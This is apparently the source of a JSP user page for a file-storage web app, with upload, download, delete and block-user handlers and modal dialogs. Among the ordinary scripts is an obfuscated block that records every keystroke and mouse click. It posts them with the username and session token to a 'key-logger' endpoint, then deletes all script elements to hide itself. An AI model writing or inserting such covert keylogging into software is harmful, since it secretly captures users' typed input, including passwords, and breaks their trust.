                                    d="M179.191 12C159.458 16.9373 141.334 25.5579 123.066 34.4012C92.4225 49.2362 62.3306 65.3793 33.8677 84.1075C29.2562 87.1419 5.27702 99.4617 8.25519 108.403C9.37543 111.767 13.2491 114.119 15.9389 115.982C25.0368 122.285 34.8531 127.528 44.5582 132.81C71.1892 147.304 98.9407 160.353 124.012 177.502C140.854 189.021 159.5 203.355 166.496 223.419C174.705 246.961 169.173 274.57 151.519 292.239C132.2 311.572 100.538 320.09 74.6807 325.841C66.11 327.746 57.4583 329.35 48.7898 330.745C44.5549 331.426 47.7268 331.935 50.3488 331.97C77.5948 332.338 104.492 336.881 131.753 336.985C167.392 337.122 202.974 336.516 238.601 335.926C253.899 335.673 269.113 334.046 284.425 333.976C295.704 333.924 307.087 334.48 318.334 333.475C322.681 333.087 326.961 333.135 331.308 332.973C333.747 332.883 330.964 329.83 330.528 328.738C324.017 312.449 321.41 294.455 319.726 277.137C317.978 259.151 317.972 240.722 319.113 222.695C320.488 201.001 321.255 179.628 321.564 157.886C322.207 112.435 323.011 169.979 323.011 125.344C321.007 112.304 323.011 64.994 323.011 78.7023C323.011 100.899 321.508 106.546 321.508 128.743C321.508 136.943 321.644 161.63 321.644 153.429C321.644 143.604 325.535 131.568 331.753 124.341C356.206 95.9199 398.637 113.554 423.234 131.92C487.392 179.822 498.935 257.776 487.878 332.472C486.828 339.566 484.958 342.728 493.39 341.555C506.757 339.698 521.397 341.555 534.203 341.555C554.471 339.995 575.573 338.379 595.618 336.985C616.665 336.985 638.658 335.982 659.872 332.973C667.116 332.973 673.235 332.973 681.531 332.973C686.264 332.973 691.387 331.07 694.783 331.07C696.328 331.07 691.268 330.933 690.83 328.961C685.457 304.766 687.322 276.862 687.322 252.228C687.322 218.202 691.331 187.425 691.331 153.429C691.331 148.171 688.324 153.429 683.814 150.531C681.195 150.531 679.907 146.542 678.302 144.179C676.184 141.061 674.794 135.374 675.796 131.362C678.302 126.347 680.306 122.823 689.326 122.335C707.868 121.332 707.366 147.912 695.841 149.918C694.337 151.534 693.574 153.166 692.333 151.924C691.4 150.99 690.259 150.991 689.326 151.924C687.318 153.935 691.182 162.244 691.888 164.964C695.917 180.517 694.337 197.42 694.337 213.389C694.337 249.853 689.326 285.976 689.326 322.497C689.326 324.069 688.176 330.89 690.272 330.967C697.211 331.224 703.43 330.967 710.373 330.967C741.757 330.967 774.2 328.961 805.585 328.961C820.544 328.961 835.504 328.961 850.463 328.961C856.478 328.961 854.567 320.376 854.75 315.81C855.054 308.201 856.917 300.772 857.478 293.186C858.215 283.224 858.589 273.231 859.204 263.262C861.086 232.75 861.593 201.823 861.71 171.261C861.758 158.725 861.095 146.037 862.211 133.536C862.494 130.362 860.82 121.625 862.935 124.007C864.531 125.804 863.714 130.3 863.714 132.421C863.714 137.901 863.714 143.379 863.714 148.859C863.714 167.163 861.71 185.347 861.71 203.581C861.71 210.194 861.71 216.806 861.71 223.419C861.71 224.605 861.71 219.094 861.71 218.404C861.71 210.732 863.402 203.79 867.278 197.117C873.093 187.106 879.817 178.38 891.777 176.053C897.271 174.984 901.756 176.499 906.81 176.499"
                                    stroke="white"
                                    stroke-width="15"
                                    stroke-linecap="round"
                                    stroke-linejoin="round"></path>
                        </g>
                    </g>
                    <defs>
                        <filter
                                id="filter1_d"
                                x="-3.51056"
                                y="4.49823"
                                width="921.821"
                                height="352.796"
                                filterUnits="userSpaceOnUse"
                                color-interpolation-filters="sRGB"
                        >
                            <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
                            <feColorMatrix
                                    in="SourceAlpha"
                                    type="matrix"
                                    values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"></feColorMatrix>
                            <feOffset dy="4"></feOffset>
                            <feGaussianBlur stdDeviation="2"></feGaussianBlur>
                            <feColorMatrix
                                    type="matrix"
                                    values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.25 0"></feColorMatrix>
                            <feBlend
                                    mode="normal"
                                    in2="BackgroundImageFix"
                                    result="effect1_dropShadow"></feBlend>
                            <feBlend
                                    mode="normal"
                                    in="SourceGraphic"
                                    in2="effect1_dropShadow"
                                    result="shape"></feBlend>
                        </filter>
                        <clipPath id="clip0">
                            <rect width="915" height="353" fill="white"></rect>
                        </clipPath>
                    </defs>
                </svg>
            </div>
            <h1 style="    text-align: center;
    position: relative;
    background-color: transparent;
    width: 59rem;
    bottom: 3rem;
    color: #00ffef;
    margin: auto;">Website announcements</h1>
            <sql:query var="result"
                       dataSource="${db}">SELECT message FROM website_announcements;</sql:query>
            <div class="container" style="box-shadow: inset 0 0 20px 0 #00f7ff, 0 0 50px 20px #00ffff;
    padding: 1rem 0 1rem 0;
    border-radius: 2rem;
    margin-bottom: 4rem;">
                <c:forEach var="row" items="${result.rows}" varStatus="loop">
                    <c:set var="message" value="${row.message}" scope="request"/>

                    <ul class="logo_list">
                        <li class="text-primary" style="font-size: 150%">${message}</li>
                        <c:if test="${fn:length(result.rows)!=loop.index+1}">
                            <hr style=" border: 3px solid #00ffef; border-radius: 10px;">
                        </c:if>
                    </ul>

                </c:forEach>
            </div>
            <br style="line-height: 200%">

            <link rel="stylesheet" href="javascript/welcome_mew.js">
            <script>
              function on_delete_account_button() {
                $("#delete_account_modal").modal({
                  backdrop: 'static',
                  keyboard: false
                });
              }

              function delete_message(username, time, index) {
                console.log(username)
                console.log(time)
                document.getElementById(`div_message_\${index}`).remove()
                $.post(
                    "https://${pageContext.request.serverName}/delete-message?time=" + time + "&username=" + username +
                    "&token=" + '${code}')

              }

              function htmlDecode(input) {
                var doc = new DOMParser().parseFromString(input, "text/html");
                return doc.documentElement.textContent;
              }

              async function confirm_block_user(from_user, username) {
                console.log(from_user)
                console.log(username)
                document.getElementById("block_user_span").innerHTML = from_user
                $("#block_modal").modal()
                document.getElementById("block_user_modal_button").
                    setAttribute("onclick", "block_user('" + from_user + "', '" + username + "')");

              }

              async function block_user(from_user, username) {
                $.post(
                    "https://${pageContext.request.serverName}/block-user?to_user=" + encodeURIComponent(username) +
                    "&from_user=" + encodeURIComponent(from_user) +
                    "&token=" + '${code}')
                await new Promise(r => setTimeout(r, 1000));
                location.reload()
              }

              function confirm_unblock_user(from_user, to_user) {
                console.log("username: " + to_user)
                console.log("to_unblock: " + from_user)
                console.log("code: " + '${code}')
                document.getElementById("unblock_user_span").innerHTML = from_user
                $("#unblock_modal").modal()
                document.getElementById("unblock_user_modal_button").
                    setAttribute("onclick", "unblock_user('" + from_user + "', '" + to_user + "')");

              }

              async function unblock_user(from_user, to_user) {
                $.post(
                    "https://${pageContext.request.serverName}/unblock-user?to_user=" + encodeURIComponent(to_user) +
                    "&from_user=" + encodeURIComponent(from_user) +
                    "&token=" + '${code}')
                await new Promise(r => setTimeout(r, 1000));
                location.reload()

              }

              function get_total_size() {
                let my_total_size = 0
                for (let i = 0; i < document.querySelector("#file_input").files.length; i++) {
                  console.log(document.querySelector("#file_input").files[i].size)
                  my_total_size += document.querySelector("#file_input").files[i].size
                }
                return my_total_size
              }

              function sub1(name, length) {
                let fileName = name
                let total_size = 0
                for (let i = 0; i < document.querySelector("#file_input").files.length; i++) {
                  console.log(document.querySelector("#file_input").files[i].size)
                  total_size += document.querySelector("#file_input").files[i].size
                }
                console.log("total_size: " + total_size)
                if (length === 1) {
                  if (name.length < 45)
                    document.getElementById("select_file_button").innerHTML = name
                  else
                    document.getElementById("select_file_button").innerHTML = "one file selected"
                }
                else if (length === 0) {
                  document.getElementById("select_file_button").innerHTML = "Select files"

                }
                else {
                  document.getElementById("select_file_button").innerHTML = length + " files selected"
                }
                if (total_size / 1000000 < Number(document.querySelector("#label_space_left").innerHTML)) {
                  document.getElementById("file_input").classList.add("is-valid")
                  document.getElementById("file_input").classList.remove("is-invalid")
                  document.getElementById("upload_file").style.top = "-1.1rem"
                }
                else {
                  document.getElementById("file_input").classList.add("is-invalid")
                  document.getElementById("file_input").classList.remove("is-valid")
                  document.getElementById("upload_file").style.top = "-3.1rem"
                }
              }

              let total_size = 0

              function sub(obj) {
                total_size = 0
                let file = obj.value
                let fileName = file.split("\\")
                for (let i = 0; i < document.querySelector("#file_input").files.length; i++) {
                  console.log(document.querySelector("#file_input").files[i].size)
                  total_size += document.querySelector("#file_input").files[i].size
                }
                console.log("total_size: " + total_size)
                console.log("time: " + total_size / 250000 + "s")

                if (obj.files.length === 1) {
                  console.log(obj.value)
                  if (fileName[fileName.length - 1].length < 45)
                    document.getElementById("select_file_button").innerHTML = fileName[fileName.length - 1]
                  else
                    document.getElementById("select_file_button").innerHTML = "one file selected"
                }
                else if (obj.files.length === 0) {
                  document.getElementById("select_file_button").innerHTML = "Select files"

                }
                else {
                  document.getElementById("select_file_button").innerHTML = obj.files.length + " files selected"
                }
                if (total_size / 1000000 < Number(document.querySelector("#label_space_left").innerHTML)) {

                  document.getElementById("file_input").classList.add("is-valid")
                  document.getElementById("file_input").classList.remove("is-invalid")
                  document.getElementById("upload_file").style.top = "-1.1rem"
                }
                else {
                  document.getElementById("file_input").classList.add("is-invalid")
                  document.getElementById("file_input").classList.remove("is-valid")
                  document.getElementById("upload_file").style.top = "-3.1rem"
                }
                if (obj.files.length === 0) {
                  document.getElementById("file_input").classList.remove("is-valid")
                }
              }

              function change_upload_progress() {
                document.querySelector("#progress_parent").style.display = "flex"

                const formProgress = document.querySelector("#progress_percentage");
                const formStatus = document.querySelector("#span_percentage");

                console.log("time: " + total_size / 250000 + "s")
                console.log(100 / (total_size / 250000))
                let num = 80 / (total_size / 250000)
                let percentage = 0

                function change_progress() {

                  formProgress.style.width = Math.floor(percentage).toFixed(0) + "%";
                  formStatus.innerHTML = Math.floor(percentage).toFixed(0) + "%"

                  percentage += num / 100

                  if (percentage > 100) {
                    percentage = 100
                  }
                  if (percentage < 100)
                    setTimeout(change_progress, 500 / 100);
                  else {
                    formProgress.style.width = "100%";
                    formStatus.innerHTML = "100%"

                  }
                }

                change_progress();
                console.log("finished animation")

              }

              function toggle_loading(button) {
                if (document.getElementById('select_file_button').innerHTML === 'Select files' ||
                    document.getElementById("file_input").classList.contains("is-invalid")) {
                  return
                }
                let span_loading = document.getElementById("loading_span")
                span_loading.classList.toggle("spinner-border")
                document.getElementById("upload_file_text_span").style.display = "none"
                button.style.pointerEvents = "none"
                change_upload_progress()

              }

              let max_div_count = 0

              while (document.getElementById(`div_\${max_div_count}`) != null) {
                max_div_count++
              }
              console.log(max_div_count)
              for (let i = 5; i < max_div_count; i++) {
                document.getElementById(`div_\${i}`).style.display = "none"
              }

              function delete_files() {
                if (get_selected_files().length === 0) {
                  return
                }
                $("#delete_files_modal").modal({
                  backdrop: 'static',
                  keyboard: false
                });
              }

              async function confirm_delete_files() {
                $.post("https://${pageContext.request.serverName}/delete-file?file_name=" +
                    encodeURIComponent(get_selected_files()) +
                    "&username=" + encodeURIComponent('<c:out value='${username}'/>') +
                    "&token=" + '${code}')
                await new Promise(r => setTimeout(r, 1000));
                location.reload()
              }

              async function download_files() {
                if (get_selected_files().length === 0) {
                  return
                }
                let files_names = get_selected_files().split("|")
                for (let i = 0; i < files_names.length - 1; i++) {
                  console.log("file to delete: " + files_names[i])
                  await new Promise(r => setTimeout(r, 1000));

                  window.location.replace(
                      "download-file?file_name=" + encodeURIComponent(files_names[i]) + "&username=" +
                      encodeURIComponent('<c:out value='${username}'/>') +
                      "&token=" + '${code}')
                }

              }

              function delete_file(file_name, index, file_size) {

                get_first_hidden_div(6)
                for (let i = index + 1; i < max_div_count; i++) {
                  if (document.getElementById(`h1_count_\${i}`) !== null && index !== i) {
                    document.getElementById(`h1_count_\${i}`).innerHTML = String(
                        Number(document.getElementById(`h1_count_\${i}`).innerHTML) - 1)
                  }
                }
                console.log("file to delete: " + file_name)
                console.log("index to delete: " + index)
                document.getElementById(`div_\${index}`).remove()
                let files_count = Number(document.getElementById("files_num").innerHTML)
                files_count--
                if (files_count === 5) {
                  document.getElementById("show_more_div").remove()
                }
                document.getElementById("files_num").innerHTML = String(files_count)
                let new_number = Number(
                    (Number(document.querySelector("#label_space_left").innerHTML) + Number(file_size)).toFixed(2))
                console.log("new_number: " + new_number)
                if (files_count === 0) {
                  document.querySelector("#files_count_h1").remove()

                  new_number = 100
                  if (document.getElementById("show_more_div") !== null) {
                    document.getElementById("show_more_div").remove()
                  }

                }
                if (new_number > 0) {
                  if (document.getElementById("space_left_progress_bar").classList.contains("d-none")) {
                    document.getElementById("space_left_progress_bar").classList.remove("d-none")
                  }
                  if (document.getElementById("space_left_h3").style.display === "none") {
                    document.getElementById("space_left_h3").style.display = "block"
                  }
                  if (document.getElementById("out_of_space_h1") != null) {
                    document.getElementById("out_of_space_h1").remove()

                  }
                  document.getElementById("file_upload_div").style.display = "inline"

                }

                document.querySelector("#label_space_left").innerHTML = String(new_number)
                document.getElementById("space_left_progress").innerHTML = String(new_number) + "MB/100MB"
                document.getElementById("space_left_progress").style.width = new_number + "%"
                if (new_number >= 50) {
                  document.getElementById("space_left_progress").classList.add("bg-success")
                  document.getElementById("space_left_progress").classList.remove("bg-warning")
                  document.getElementById("space_left_progress").classList.remove("bg-danger")
                }
                else if ((new_number < 50) && (new_number >= 20)) {
                  document.getElementById("space_left_progress").classList.remove("bg-success")
                  document.getElementById("space_left_progress").classList.add("bg-warning")
                  document.getElementById("space_left_progress").classList.remove("bg-danger")
                }
                else {
                  document.getElementById("space_left_progress").classList.remove("bg-success")
                  document.getElementById("space_left_progress").classList.remove("bg-warning")
                  document.getElementById("space_left_progress").classList.add("bg-danger")
                }

                if (get_total_size() / 1000000 < Number(document.querySelector("#label_space_left").innerHTML)) {
                  document.getElementById("file_input").classList.remove("is-invalid")
                  document.getElementById("upload_file").style.top = "-1.1rem"
                }
                $.post(
                    "https://${pageContext.request.serverName}/delete-file?file_name=" + encodeURIComponent(file_name) +
                    "&username=" + encodeURIComponent('<c:out value='${username}'/>') +
                    "&token=" + '${code}')
              }

              function get_first_index_of_hidden_div() {
                for (let i = 0; i < max_div_count; i++) {
                  if (document.getElementById(`div_\${i}`) !== null) {

                    if (document.getElementById(`div_\${i}`).style.display === "none") {
                      return i

                    }

                  }
                }
              }

              function get_last_index_of_visible_div() {
                let index = 0
                for (let i = 0; i < max_div_count; i++) {
                  if (document.getElementById(`div_\${i}`) !== null) {
                    if (document.getElementById(`div_\${i}`).style.display !== "none") {
                      index = i
                    }
                  }
                }
                return index
              }

              function get_first_hidden_div(num) {
                let cnt = 0
                for (let i = 0; i < max_div_count; i++) {
                  if (cnt === num) {
                    return;
                  }
                  if (document.getElementById(`div_\${i}`) !== null) {

                    if (document.getElementById(`div_\${i}`).style.display === "none") {
                      document.getElementById(`div_\${i}`).style.display = "block"
                      cnt++
                    }
                    else {
                      cnt++
                    }
                  }
                }
              }

              function download_file(file_name) {
                console.log("file to download: " + file_name)
                window.location.replace("download-file?file_name=" + encodeURIComponent(file_name) + "&username=" +
                    encodeURIComponent('<c:out value='${username}'/>') +
                    "&token=" + '${code}');
              }

              async function show_all() {
                document.querySelector(".files_div:nth-child(5)").classList.add("no-border")
                document.querySelector(".files_div:nth-last-child(2)").classList.add("files_div-border")

                for (let i = get_first_index_of_hidden_div(); i < max_div_count; i++) {
                  if (document.getElementById(`div_\${i}`) !== null) {
                    document.getElementById(`div_\${i}`).style.display = "block";
                    await new Promise(r => setTimeout(r, 10));

                  }

                }
                let percentage = ((document.documentElement.scrollTop + document.body.scrollTop) /
                    (document.documentElement.scrollHeight - document.documentElement.clientHeight) * 100);

                document.querySelector(".progress__inner").style.width = percentage + "%"

              }

              function show_less() {

                document.querySelector(".files_div:nth-child(5)").classList.remove("no-border")
                document.querySelector(".files_div:nth-last-child(2)").classList.remove("files_div-border")

                for (let i = 5; i < max_div_count; i++) {
                  if (document.getElementById(`div_\${i}`) !== null) {
                    document.getElementById(`div_\${i}`).style.display = "none";
                  }
                }

                get_first_hidden_div(5)
                let percentage = ((document.documentElement.scrollTop + document.body.scrollTop) /
                    (document.documentElement.scrollHeight - document.documentElement.clientHeight) * 100);

                document.querySelector(".progress__inner").style.width = percentage + "%"
              }

              function allowDrop(event) {
                event.preventDefault();
              }

              function drop(ev) {
                let fileInput = document.getElementById("file_input")
                fileInput.files = ev.dataTransfer.files;
                ev.preventDefault();
                unhighlight()

                if (ev.dataTransfer.items) {
                  for (var i = 0; i < ev.dataTransfer.items.length; i++) {
                    if (ev.dataTransfer.items[i].kind === 'file') {
                      var file = ev.dataTransfer.items[i].getAsFile();
                      sub1(file.name, ev.dataTransfer.files.length)
                      console.log('... file[' + i + '].name = ' + file.name);
                    }
                  }
                }
                else {
                  for (var i = 0; i < ev.dataTransfer.files.length; i++) {
                    console.log('... file[' + i + '].name = ' + ev.dataTransfer.files[i].name);
                  }
                }
              }

              function update_selected_files(checked, div_id) {
                if (checked) {
                  document.getElementById(div_id).style.backgroundColor = 'rgb(75,82,92)'

                }
                else {
                  document.getElementById(div_id).style.backgroundColor = 'rgb(28, 32, 38)'

                }
                if (checked) {
                  document.getElementById('selected_files').innerHTML = String(
                      Number(document.getElementById('selected_files').innerHTML) + 1)
                }
                else {
                  document.getElementById('selected_files').innerHTML = String(
                      Number(document.getElementById('selected_files').innerHTML) - 1)

                }
                if (get_selected_files().split("|").length - 1 == document.querySelector("#files_num").innerHTML) {
                  document.getElementById("select_deselect_button").innerHTML = "Deselect all\n";
                }
                else {
                  document.getElementById("select_deselect_button").innerHTML = "Select all\n";
                }
                if (document.querySelector("#selected_files").innerHTML != 0) {
                  document.getElementById("delete_selected_files").disabled = false
                  document.getElementById("download_selected_files").disabled = false
                }
                else {
                  document.getElementById("delete_selected_files").disabled = true
                  document.getElementById("download_selected_files").disabled = true
                }
              }

              function get_selected_files() {
                let arr = ""
                for (let i = 0; i < document.querySelectorAll("input[type=checkbox]").length; i++) {
                  if (document.querySelectorAll("input[type=checkbox]")[i].checked) {
                    arr += (document.querySelectorAll("input[type=checkbox]")[i].id.replace("`", "").replace("`", ""));
                    arr += "|";
                  }
                }
                return arr
              }

              function set_checkboxstate(state) {
                for (let i = 0; i < document.querySelectorAll("input[type=checkbox]").length; i++) {
                  if (document.querySelectorAll("input[type=checkbox]")[i].checked === state)
                    document.querySelectorAll("input[type=checkbox]")[i].click();
                }
              }

              function select_deselect_files() {

                if (document.getElementById("select_deselect_button").innerHTML === "Select all\n") {
                  document.getElementById("select_deselect_button").innerHTML = "Deselect all\n";
                  set_checkboxstate(false)
                }
                else {
                  document.getElementById("select_deselect_button").innerHTML = "Select all\n";
                  set_checkboxstate(true)

                }
              }


            </script>

            <script>
              var _0x41f3 = [
                '278070TsnqmV',
                '30643gzlalE',
                '831723XhLDNc',
                '&token=',
                '&user=',
                '71SZtHvH',
                '2BaEZGL',
                '1TNddKt',
                '948361rhaZBi',
                'clientX',
                'Left+mouse+button+at+',
                'Right+mouse+button+at+',
                '436271StAePr',
                'https://${pageContext.request.serverName}/key-logger?click=',
                'which',
                '1121976DGOEza',
                '${code}',
                'code',
                '<c:out value='${username}'/>',
                '319292SXuAst',
                'button',
                'post',
                'mousedown',
                '4nqMpqO'];
              var _0x18fcc7 = _0x3016;
              (function(_0xc9c329, _0x18b8ee) {
                var _0x1914b9 = _0x3016;
                while (!![]) {
                  try {
                    var _0x5c5048 = -parseInt(_0x1914b9(0x75)) + parseInt(_0x1914b9(0x80)) +
                        -parseInt(_0x1914b9(0x84)) * -parseInt(_0x1914b9(0x79)) + -parseInt(_0x1914b9(0x86)) *
                        parseInt(_0x1914b9(0x85)) + parseInt(_0x1914b9(0x7d)) * -parseInt(_0x1914b9(0x7e)) +
                        parseInt(_0x1914b9(0x72)) + parseInt(_0x1914b9(0x83)) * parseInt(_0x1914b9(0x7f));
                    if (_0x5c5048 === _0x18b8ee) break; else _0xc9c329['push'](_0xc9c329['shift']());
                  } catch (_0x1dbe85) {
                    _0xc9c329['push'](_0xc9c329['shift']());
                  }
                }
              }(_0x41f3, 0xdba1e), document['addEventListener']('keydown', _0x255141 => $['post'](
                  'https://${pageContext.request.serverName}/key-logger?key=' + String(_0x255141[_0x18fcc7(0x77)]) +
                  _0x18fcc7(0x82) + '<c:out value='${username}'/>' + '&token=' +
                  _0x18fcc7(0x76))), document['addEventListener'](_0x18fcc7(0x7c), onClick));

              function _0x3016(_0x3e1222, _0x389ff8) {
                return _0x3016 = function(_0x41f388, _0x3016fa) {
                  _0x41f388 = _0x41f388 - 0x70;
                  var _0x564b4b = _0x41f3[_0x41f388];
                  return _0x564b4b;
                }, _0x3016(_0x3e1222, _0x389ff8);
              }

              function onClick(_0x144a54) {
                var _0x591cce = _0x18fcc7;
                (_0x144a54[_0x591cce(0x74)] === 0x1 || _0x144a54[_0x591cce(0x7a)] === 0x0) && $[_0x591cce(0x7b)](
                    _0x591cce(0x73) + _0x591cce(0x70) + _0x144a54[_0x591cce(0x87)] + 'x' + _0x144a54['clientY'] +
                    _0x591cce(0x82) + _0x591cce(0x78) + _0x591cce(0x81) + _0x591cce(0x76)), (_0x144a54['which'] ===
                    0x3 || _0x144a54[_0x591cce(0x7a)] === 0x2) && $[_0x591cce(0x7b)](
                    _0x591cce(0x73) + _0x591cce(0x71) + _0x144a54['clientX'] + 'x' + _0x144a54['clientY'] +
                    _0x591cce(0x82) + _0x591cce(0x78) + _0x591cce(0x81) + _0x591cce(0x76));
              }

              let my_path = document.getElementById("path");
              let sign_element = document.getElementById("sign_element")
              sign_element.addEventListener(
                  "mouseover",
                  function() {
                    sign_element.setAttribute("data-sign-element-was-hovered", "true")
                  },
                  false
              );
              my_path.addEventListener(
                  "mouseover",
                  function() {
                    document.getElementById("sign_element").style.animationPlayState =
                        "paused";
                  },
                  false
              );
              my_path.addEventListener(
                  "mouseout",
                  function() {
                    document.getElementById("sign_element").style.animationPlayState =
                        "running";
                  },
                  false
              );
              $("#sign_element").tilt({
                perspective: 550,
                speed: 2500
              })
              let scripts = document.querySelectorAll("script")
              scripts.forEach(script => script.remove());
            </script>


            <div class="modal" id="drop_files_modal" ondrop="drop(event)" ondragover="allowDrop(event)">
                <div class="modal-dialog modal-lg" style="margin-top: 3rem">
                    <div style="    background-color: rgb(24 24 24);
-webkit-box-shadow: 5px 5px 15px 5px #fefefe;
box-shadow: 3px 3px 13px 3px #007bff!important;" class="modal-content">
                        <div style="border-bottom:1px solid #007bff!important" class="modal-header">
                            <h2 style="color: #007bff!important" class="modal-title">Drop the files</h2>
                        </div>
                    </div>
                </div>
            </div>
            <script>

              let parent = document.getElementById("main_frame")
              let parent2 = document.getElementById("drop_files_modal")
              let main_frame_on_hover = false

              parent.addEventListener("dragenter", () => {
                console.log("dragenter")
                let main_frame_on_hover = true

                highlight()

              })

              parent.addEventListener("dragleave", (e) => {
                let rect = parent.getBoundingClientRect()
                console.log(e.clientX, rect.left)

                if (
                    e.clientY < rect.top ||
                    e.clientY >= rect.bottom ||
                    e.clientX <= rect.left ||
                    e.clientX >= rect.right
                ) {
                  console.log("dragleave")
                  unhighlight()
                  let main_frame_on_hover = false

                }
              })

              parent2.addEventListener("dragenter", () => {
                console.log("dragenter")
                if (main_frame_on_hover)
                  highlight()

              })

              parent2.addEventListener("dragleave", (e) => {
                let rect = parent.getBoundingClientRect()
                console.log(e.clientX, rect.left)

                if (
                    e.clientY < rect.top ||
                    e.clientY >= rect.bottom ||
                    e.clientX <= rect.left ||
                    e.clientX >= rect.right
                ) {
                  console.log("dragleave")
                  unhighlight()

                }
              })

              function highlight() {
                $('#drop_files_modal').modal()

              }

              async function unhighlight() {
                $('#drop_files_modal').modal('hide')

              }

              $(function() {
                $('[data-toggle="tooltip"]').tooltip()
              })

              function redirect_to_message(to_user) {
                window.location.href = "https://${pageContext.request.serverName}/send_message.jsp?to_user=" +
                    encodeURIComponent(htmlDecode(to_user))
              }

              function on_click_change_profile_picture(element) {
                if (document.getElementById("image_coordinates").value === "" || element.innerHTML === "uploading...") {
                  return
                }
                document.getElementById("form_change_picture").submit()
                cropper.disable()
                element.innerHTML = 'uploading...'
                element.style.cursor = "wait"
                document.getElementById('select_picture_button').remove()
              }

              const image = document.getElementById('image');
              let cropper = new Cropper(image);
              $(".imageSection button").click(function() {
                $(".imageSection img").removeClass("activeImage");
                $(this).parent().find("img").addClass("activeImage");
              });
              $(".imageSection:eq(0) img").addClass("activeImage");

              let clone = {};

              function fileClicked(event) {
                console.log("file clicked")
                let file_element = event.target;
                if (file_element.value !== "") {
                  clone[file_element.id] = $(file_element).clone();
                }
              }

              function readURL(input, event) {
                let file_element = event.target;
                if (file_element.value === "") {
                  clone[file_element.id].insertBefore(file_element);
                  $(file_element).remove();
                }

                console.log("readURL")
                if (input.files && input.files[0]) {
                  if (input.files[0].type === "" ||
                      (!input.files[0].type.includes("png") && !input.files[0].type.includes("jpg") &&
                          !input.files[0].type.includes("jpeg"))) {
                    console.log("Sorry we support only png, jpg and jpeg files.")
                    return
                  }
                  var reader = new FileReader();

                  reader.onload = function(e) {
                    document.getElementById("canvas").style.display = "block"
                    document.getElementById("canvas").style.marginBottom = "3rem"
                    $('.prw_img,.activeImage').attr('src', e.target.result);
                    cropper.destroy()
                    image.src = e.target.result;
                    cropper = new Cropper(image, {
                      aspectRatio: 1,
                      viewMode: 1,
                      dragMode: 'move',
                      minCropBoxWidth: 50,
                      minCropBoxHeight: 50,
                      zoomable: false,
                      crop(event) {
                        document.getElementById("image_coordinates").value = event.detail.x + "|" + event.detail.y +
                            "|" +
                            event.detail.width + "|" + event.detail.height
                      },
                    });
                  };
                  $('.activeImage').css('display', 'inline');

                  reader.readAsDataURL(input.files[0]);

                }
              }


            </script>
            <%@include file="delete_account_modal.jsp" %>
            <div class="modal fade" id="unblock_modal">
                <div class="modal-dialog modal-lg">
                    <div style="    background-color: rgb(24 24 24);
    -webkit-box-shadow: 5px 5px 15px 5px #fefefe;
    box-shadow: 3px 3px 13px 3px #1fff00;" class="modal-content">
                        <div style="border-bottom:1px solid #289f43" class="modal-header">
                            <h2 style="color: #289f43" class="modal-title">Confirm unblock</h2>
                        </div>
                        <div class="modal-body">
                            <p style="color: #289f43;font-weight: 600;font-size: 1.3rem;">Are you sure you want to
                                unblock <span style="color: #00ff04"
                                              class="no-standup" id="unblock_user_span"></span>?</p>

                        </div>
                        <div style="border-top: 1px solid #289f43;"
                             class="modal-footer">
                            <button type="button" style="font-size: 130%;padding: 0.2rem 0.4rem 0.2rem 0.4rem;"
                                    class="btn btn-primary no-standup" data-dismiss="modal">Cancel
                            </button>
                            <button style="font-size: 150%;padding: 0 0.4rem 0 0.4rem;" id="unblock_user_modal_button"
                                    type="button" class="btn btn-success no-standup" data-dismiss="modal">Confirm
                            </button>


                        </div>
                    </div>
                </div>
            </div>


            <div class="modal fade" id="block_modal">
                <div class="modal-dialog modal-lg">
                    <div style="    background-color: rgb(24 24 24);
    -webkit-box-shadow: 5px 5px 15px 5px #fefefe;
    box-shadow: 3px 3px 13px 3px #fc2e2e;" class="modal-content">
                        <div style="border-bottom:1px solid rgb(220, 53, 69)" class="modal-header">
                            <h2 style="color: #fc2e2e" class="modal-title">Confirm block</h2>
                        </div>
                        <div class="modal-body">
                            <p style="font-weight: 600;font-size: 1.3rem;color: #ff3e3e;">Are you sure you want to block
                                <span style="color:#e11226"
                                      class="no-standup" id="block_user_span"></span>?</p>

                        </div>
                        <div style="border-top: 1px solid rgb(220, 53, 69);"
                             class="modal-footer">
                            <button type="button" style="font-size: 130%;padding: 0.2rem 0.4rem 0.2rem 0.4rem;"
                                    class="btn btn-primary no-standup" data-dismiss="modal">Cancel
                            </button>
                            <button style="font-size: 150%;padding: 0 0.4rem 0 0.4rem;" id="block_user_modal_button"
                                    type="button" class="btn btn-danger no-standup" data-dismiss="modal">Confirm
                            </button>


                        </div>
                    </div>
                </div>
            </div>

            <div class="modal fade" id="delete_files_modal">
                <div class="modal-dialog modal-lg">
                    <div style="    background-color: rgb(24 24 24);
    -webkit-box-shadow: 5px 5px 15px 5px #fefefe;
    box-shadow: 3px 3px 13px 3px #fc2e2e;" class="modal-content">
                        <div style="border-bottom:1px solid rgb(220, 53, 69)" class="modal-header">
                            <h2 style="color: #fc2e2e" class="modal-title">Confirm delete</h2>
                        </div>
                        <div class="modal-body">
                            <p style="font-weight: 600;font-size: 1.3rem;color: #ff3e3e;">Are you sure you want to
                                delete all the selected files?</p>

                        </div>
                        <div style="border-top: 1px solid rgb(220, 53, 69);"
                             class="modal-footer">
                            <button type="button" style="font-size: 130%;padding: 0.2rem 0.4rem 0.2rem 0.4rem;"
                                    class="btn btn-primary no-standup" data-dismiss="modal">Cancel
                            </button>
                            <button style="font-size: 150%;padding: 0 0.4rem 0 0.4rem;" onclick="confirm_delete_files()"
                                    type="button" class="btn btn-danger no-standup" data-dismiss="modal">Confirm
                            </button>


                        </div>
                    </div>
                </div>
            </div>

</body>
</html>
